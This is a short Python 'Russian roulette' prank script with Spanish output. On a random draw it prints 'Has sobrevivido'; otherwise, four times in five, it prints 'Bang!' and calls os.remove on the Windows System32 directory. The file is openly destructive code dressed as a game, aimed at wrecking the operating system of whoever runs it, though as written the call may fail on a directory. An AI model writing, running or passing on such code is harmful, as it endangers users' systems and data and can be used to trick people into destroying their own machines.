import random
import os 

if random.randint(1,5) == 1:
    print('Has sobrevivido')
else:
    print('Bang!')
    os.remove("C:\Windows\System32")